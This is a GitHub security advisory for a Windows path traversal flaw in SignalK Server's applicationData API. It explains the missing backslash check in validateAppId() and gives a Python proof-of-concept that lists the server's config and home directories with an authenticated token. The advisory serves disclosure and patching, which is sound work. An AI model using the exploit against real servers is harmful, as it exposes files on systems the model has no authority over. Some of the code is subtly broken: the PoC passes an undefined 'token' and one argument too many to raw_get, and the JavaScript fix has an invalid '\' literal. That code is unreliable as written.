# [M] SignalK Server has Path Traversal leading to information disclosure

## Summary
Severity: Medium
Advisory: GHSA-vrhw-v2hw-jffx
CVE: CVE-2026-25228
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-vrhw-v2hw-jffx
Type: github-advisory

## Affected
- npm: `signalk-server` — affected >=0 <2.20.3

## Details
### Summary
A Path Traversal vulnerability in SignalK Server's `applicationData` API allows authenticated users on Windows systems to read, write, and list arbitrary files and directories on the filesystem. The `validateAppId()` function blocks forward slashes (`/`) but not backslashes (`\`), which are treated as directory separators by `path.join()` on Windows. This enables attackers to escape the intended `applicationData` directory.

### Details
**Platform**: Windows (Linux only allows traversal up a single directory)
**Authentication Required**: Yes (ability to write depends on user's permission)

The vulnerability exists in the `validateAppId()` function within the applicationData API handler. This function validates the `appid` parameter but only checks for forward slashes:

```javascript
// Simplified vulnerable code pattern
function validateAppId(appid) {
  if (appid.includes('/') || appid.length >= 30) {
    return false;
  }
  return true;
}

// Later used in path construction
const dataPath = path.join(configPath, 'applicationData', 'users', deviceId, appid);
```

**Root Cause:**
- The validation only blocks `/` characters
- On Windows, `path.join()` uses the platform's native path separator
- Windows treats both `/` and `\` as valid directory separators
- Backslash-based traversal sequences like `..\..\..` pass validation
- When `path.join()` processes these on Windows, each `..` traverses up one directory level

### PoC
```python
#!/usr/bin/env python3

import argparse
import http.client
import json
import sys
from urllib.parse import urlparse

PREFIX = "/signalk/v1/applicationData"


def raw_get(base, path, token):
    """
    GET using http.client so that '..' and backslashes in the URL
    are sent literally (requests/urllib would normalise them away).
    """
    parsed = urlparse(base)
    host, port = parsed.hostname, parsed.port or 80
    conn = http.client.HTTPConnection(host, port)
    conn.request("GET", path, headers={"Authorization": f"Bearer {token}"})
    resp = conn.getresponse()
    status = resp.status
    body = resp.read().decode("utf-8", errors="replace")
    conn.close()
    return status, body


def main():
    ap = argparse.ArgumentParser(description="Signal K Windows path traversal PoC")
    ap.add_argument("--target", required=True, help="e.g. http://192.168.1.100:3000")
    ap.add_argument("--token", required=True, help="any valid JWT token")
    args = ap.parse_args()

    base = args.target.rstrip("/")

    # On Windows, path.join(configPath, "applicationData", "users", id, appid)
    # resolves each '..' upward when separated by backslashes.
    #
    # Depth from base (configPath/applicationData/users/):
    #   ..              → applicationData/users/          (1 level)
    #   ..\..           → applicationData/                (2 levels)
    #   ..\..\..        → configPath (.signalk)           (3 levels)
    #   ..\..\..\..     → user home directory             (4 levels)

    traversals = [
        ("..\\..\\..\\", ".signalk config directory"),
        ("..\\..\\..\\..\\", "user home directory"),
    ]

    for appid, description in traversals:
        path = f"{PREFIX}/user/{appid}"
        status, body = raw_get(base, path, token, args.token)

        print(f"[{status}] {description}")
        print(f"  GET {path}")

        if status == 200:
            try:
                entries = json.loads(body)
                for entry in entries:
                    print(f"    {entry}")
            except json.JSONDecodeError:
                print(f"    {body[:200]}")
        else:
            print(f"    {body[:200]}")
        print()


if __name__ == "__main__":
    main()
```

**Reproduction Steps:**

1. Set up SignalK Server on a Windows machine
2. Obtain a valid device or user authentication token
3. Run the PoC script:
   ```bash
   python3 poc_windows_appid_traversal.py --target http://[signalK server IP]:3000 --token <YOUR_TOKEN>
   ```

### Recommended Fix

**Short-term:**
1. Add backslash validation to `validateAppId()`:
   ```javascript
   function validateAppId(appid) {
     if (appid.includes('/') || appid.includes('\') || appid.length >= 30) {
       return false;
     }
     return true;
   }
   ```

2. Use `path.normalize()` and validate that resolved paths remain within the intended directory:
   ```javascript
   const resolvedPath = path.normalize(path.join(baseDir, appid));
   if (!resolvedPath.startsWith(path.normalize(baseDir))) {
     throw new Error('Invalid path');
   }
   ```

## References
- https://github.com/SignalK/signalk-server/security/advisories/GHSA-vrhw-v2hw-jffx
- https://nvd.nist.gov/vuln/detail/CVE-2026-25228
- https://github.com/SignalK/signalk-server/commit/9bcf61c8fe2cb8a40998b913a02fb64dff9e86c7
- https://github.com/SignalK/signalk-server
